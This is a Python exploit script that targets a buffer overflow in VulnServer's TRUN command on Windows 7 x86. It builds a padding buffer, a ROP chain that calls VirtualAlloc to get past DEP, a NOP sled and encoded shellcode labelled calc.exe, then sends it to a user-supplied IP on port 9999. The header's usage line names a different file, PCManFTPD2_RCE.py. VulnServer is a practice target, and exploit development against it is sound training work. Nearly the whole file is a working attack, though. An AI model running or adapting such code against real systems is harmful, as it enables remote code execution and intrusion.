#!/usr/bin/env python

#---------------------------------------------------#
# Author: Krkn                                      #
# Target ARCH: Win7 - x86                           #
# Description: Buffer overflow in VulnServer TRUN   #
# command. Uses ROP chain to bypass ASLR and DEP    #
# Usage: python PCManFTPD2_RCE.py                   #
#---------------------------------------------------#


import socket
import time
import struct

target = raw_input("[!] Enter target IP: ")

junk = '\x41' * 2006
nop = '\x90' * 20

print("[!] Preparing ROP Chain...")

def create_rop_chain():
	rop_gadgets = [
		#[---INFO:gadgets_to_set_esi:---]
		0x76133753,  # POP ECX # RETN [WS2_32.DLL] ** REBASED ** ASLR
                0x75531298,  # ptr to &VirtualAlloc() [IAT mswsock.dll] ** REBASED ** ASLR
                0x75f5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR
                #[---INFO:gadgets_to_set_ebp:---]
                0x7608b2d9,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
                0x625011af,  # & jmp esp [essfunc.dll]
                #[---INFO:gadgets_to_set_ebx:---]
                0x760a1cf2,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
                0xffffffff,  # Value to negate, will become 0x00000001
                0x75f42fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR
                0x77a89ed5,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR
                #[---INFO:gadgets_to_set_edx:---]
                0x76b64185,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
                0xa28008fb,  # put delta into eax (-> put 0x00001000 into edx)
                0x766f6803,  # ADD EAX,5D800705 # RETN 0x10 [kernel32.dll] ** REBASED ** ASLR
                0x766ef97b,  # XCHG EAX,EDX # RETN 0x00 [kernel32.dll] ** REBASED ** ASLR
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                #[---INFO:gadgets_to_set_ecx:---]
                0x76103836,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
                0xffffffc0,  # Value to negate, will become 0x00000040
                0x76b21483,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
                0x77a89a68,  # XCHG EAX,ECX # RETN [ntdll.dll] ** REBASED ** ASLR
                #[---INFO:gadgets_to_set_edi:---]
                0x77a3527a,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
                0x76b21485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
                #[---INFO:gadgets_to_set_eax:---]
                0x760a1cf2,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
		0x90909090,  # nop
		#[---INFO:pushad:---]
		0x76b70241,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR
		]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
rop_chain = create_rop_chain()

print("[+] ROP Chain prepared!")
print("[!] Preparing calc.exe shellcode...")
shellcode = ("\xba\xb2\x87\x9e\x34\xda\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x31\x31\x53\x13\x83\xeb\xfc\x03\x53\xbd\x65\x6b\xc8\x29\xeb"
"\x94\x31\xa9\x8c\x1d\xd4\x98\x8c\x7a\x9c\x8a\x3c\x08\xf0\x26"
"\xb6\x5c\xe1\xbd\xba\x48\x06\x76\x70\xaf\x29\x87\x29\x93\x28"
"\x0b\x30\xc0\x8a\x32\xfb\x15\xca\x73\xe6\xd4\x9e\x2c\x6c\x4a"
"\x0f\x59\x38\x57\xa4\x11\xac\xdf\x59\xe1\xcf\xce\xcf\x7a\x96"
"\xd0\xee\xaf\xa2\x58\xe9\xac\x8f\x13\x82\x06\x7b\xa2\x42\x57"
"\x84\x09\xab\x58\x77\x53\xeb\x5e\x68\x26\x05\x9d\x15\x31\xd2"
"\xdc\xc1\xb4\xc1\x46\x81\x6f\x2e\x77\x46\xe9\xa5\x7b\x23\x7d"
"\xe1\x9f\xb2\x52\x99\x9b\x3f\x55\x4e\x2a\x7b\x72\x4a\x77\xdf"
"\x1b\xcb\xdd\x8e\x24\x0b\xbe\x6f\x81\x47\x52\x7b\xb8\x05\x38"
"\x7a\x4e\x30\x0e\x7c\x50\x3b\x3e\x15\x61\xb0\xd1\x62\x7e\x13"
"\x96\x9d\x34\x3e\xbe\x35\x91\xaa\x83\x5b\x22\x01\xc7\x65\xa1"
"\xa0\xb7\x91\xb9\xc0\xb2\xde\x7d\x38\xce\x4f\xe8\x3e\x7d\x6f"
"\x39\x5d\xe0\xe3\xa1\x8c\x87\x83\x40\xd1")

print("[+] Shellcode prepared!")

sploit = junk + rop_chain + nop + shellcode

print("[!] Connecting to target...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 9999))
s.recv(1024)
print("[+] Connected to target!")
print("[!] Sending malicious TRUN command...")
time.sleep(1)
s.send('TRUN .' + sploit + '\r\n')
print("[+] Malicious TRUN command sent! Check victim!")
s.recv(1024)

time.sleep(1)
s.send('EXIT' + '\r\n')
s.recv(1024)
time.sleep(1)
s.close()
